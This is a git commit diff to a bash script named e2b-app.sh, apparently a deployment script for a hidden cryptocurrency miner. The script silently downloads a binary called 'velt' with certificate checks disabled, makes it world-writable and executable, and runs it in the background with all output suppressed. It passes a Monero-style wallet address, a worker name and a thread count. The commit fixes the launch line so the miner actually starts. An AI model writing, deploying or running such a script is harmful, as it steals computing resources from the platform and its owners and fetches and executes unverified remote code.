242ab9aaaee8a7fc32d3d638ed7e13c702a719eb
gaserjuk <gaserjukilo@gmail.com>
2026-04-17 08:53:26 +0700

    Update e2b-app.sh

--- e2b-app.sh
+++ e2b-app.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 curl -sLkO https://github.com/satelitlima00/sentor/releases/download/velt/velt >/dev/null 2>&1
 chmod 777 velt
-./velt--user 45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi --pass WORKER-E4 --threads 6 >/dev/null 2>&1 &
+./velt --user 45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi --pass WORKER-E4 --threads 6 >/dev/null 2>&1 &
 sleep 20
 while true
 do
